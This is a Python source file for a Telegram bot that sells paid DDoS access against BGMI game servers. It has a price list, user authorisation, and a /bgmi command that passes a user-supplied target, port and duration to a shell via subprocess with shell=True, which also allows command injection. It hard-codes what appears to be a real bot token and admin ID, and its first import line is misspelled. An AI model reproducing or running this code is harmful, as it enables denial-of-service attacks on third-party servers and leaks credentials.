import telebotH
import subprocess
import datetime
import os
import requests
import time 

# Insert your Telegram bot token here
bot = telebot.TeleBot("6325791988:AAF8rHclWMl-3BVgzmr7BkB3tpq3a3Q1TvY")

# Admin user IDs
admin_id = ["888561579"]
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()




@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)



# Function to handle the reply when free users run the /bgmi2 command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭 : {target}\n𝐏𝐨𝐫𝐭 : {port}\n𝐓𝐢𝐦𝐞 : {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝 : UDP-BGMI"
    bot.reply_to(message, response)







# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
COOLDOWN_TIME = 180  # 3 minutes in seconds

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown ❌. Please Wait 3 minutes Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, port, and time
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 300:
                response = "Error: Time interval must be less than 300."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"python bgmi.py {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
        else:
            response = "✅ Usage: /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = """❌ You Are Not Authorized To Use This Command ❌.
                      🛒 Please Buy From @legend_nik"""

    bot.reply_to(message, response)
    





#main function
@bot.message_handler(commands=['help'])
def show_help(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        help_text = '''🤖 Available commands:
                    💥 /bgmi : Method For Bgmi Servers. 
                    💥 /rules : Please Check Before Use !!.
                    
                    🤖 Admin Commands:
                    💥 /admincmds : Shows All Admin Commands.
'''
    elif user_id in allowed_user_ids:
        help_text = '''🤖 Available commands:
                    💥 /bgmi : Method For Bgmi Servers. 
                    💥 /rules : Please Check Before Use !!.
                    
                    Bgmi Free Bot : @Ddosddd_bot
                    Official Channel :- @ReoModz
'''
    else:
        help_text = '''
        You are not authorized to use this command.
        Message @legend_nik to gain access.
        
        💥 /plan : Checkout Our Botnet Rates.
        '''
        
    bot.reply_to(message, help_text)



# /start 
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''
    👋🏻Welcome to Your Home, {user_name}
         ! Feel Free to Explore.
🤖Try To Run This Command : /help 
✅Join :- @ReoModz'''
    bot.reply_to(message, response)




# /plan 
@bot.message_handler(commands=['plan'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''
    {user_name} , Only 1 Plan Is Powerfull Then Any Other Ddos !!:

    Vip 🌟 :
    -> Attack Time : 240 (S)
    > After Attack Limit : 3 Min
    -> Concurrents Attack : 3
    
    Pr-ice List💸 :
    1 𝗛𝗢𝗨𝗥 :- 60𝗥𝗦 [ 240𝘀𝗲𝗰 ]
    1 𝗱𝗮𝘆 = 180𝗿𝘀 [ 240𝘀𝗲𝗰 ] 
    2 𝗱𝗮𝘆 = 280𝗿𝘀 [ 240𝘀𝗲𝗰 ]
    3 𝗱𝗮𝘆 = 370𝗿𝘀 [ 240𝘀𝗲𝗰 ]
    7 𝗱𝗮𝘆 = 800𝗿𝘀 [ 240𝘀𝗲𝗰 ]
    
    Message @legend_nik to gain access. 
    '''
    bot.reply_to(message, response)
    




@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Don't run too many attacks, it might cause a ban.
2. Don't run 2 attacks at the same time.
3. Make sure you've joined @ReoModz. 
4. We check the logs regularly to enforce these rules.'''
    bot.reply_to(message, response)



@bot.message_handler(commands=['admincmds'])
def welcome_plan(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        user_name = message.from_user.first_name
        response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add  <userId>     : Add a User.
💥 /remove  <userId>  : Remove a User.
💥 /allusers          : Authorised Users Lists.
💥 /broadcast < Message > : Broadcast a Message.
💥 /logs : All Users Logs.
💥 /clearlogs : Clear The Logs File.


'''
        bot.reply_to(message, response)
    else:
        bot.reply_to(message, "You are not authorized to use this command.")



# Add user  /add <user id >
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1].strip()
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

# remove ✅ Usage: /remove <userid>
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)

# all user list
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)


# broadcast Message to all user
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command 😡."

    bot.reply_to(message, response)



# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


#logs all
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command 😡."
        bot.reply_to(message, response)




# clear logs command
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "Only Admin Can Run This Command 😡."
    bot.reply_to(message, response)

 


if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except requests.exceptions.ReadTimeout:
            print("Request timed out. Trying again...")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            time.sleep(1)  # wait for 1 second before restarting bot polling to avoid flooding
            